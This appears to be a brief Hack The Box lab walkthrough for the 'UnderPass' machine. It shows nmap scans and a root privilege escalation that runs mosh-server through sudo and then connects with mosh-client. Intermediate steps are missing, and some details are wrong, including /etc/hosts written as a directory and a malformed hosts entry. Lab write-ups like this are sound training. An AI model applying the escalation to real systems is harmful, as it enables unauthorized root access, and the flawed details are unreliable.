# UnderPass-HTB-Walkthrough
# Port Scanning
for my HTB machine I was using the IP Address 10.10.11.48 , before doing a nmap scan you will need to add the IP and host in /etc/hosts/ directory and save it like this 10.10.11.48.underpass.htb

command to acccess /etc/hosts:

- sudo nano /etc/hosts/
- sudo cat /etc/hosts/ (This is good to always double check your work before moving on)

Now, moving on to the nmap scaning to find open ports:
- nmap -sV -Pn 10.10.11.48

damn this didnt give me anything good, so i run a TCP and UPD scan to see all the other open ports:
- sudo nmap -sU underpass.htb -Pn










# Root Flag
using the command sudo -l this help me list the current user privileges level , I find that the mosh-server doesnot need root privilege and I am able to go inside this directory.

using these command one by one will give you access to mosh-server:

- sudo /usr/bin/mosh-server new -p 61113
- MOSH_KEY=<Key> mosh-client 127.0.0.1 61113
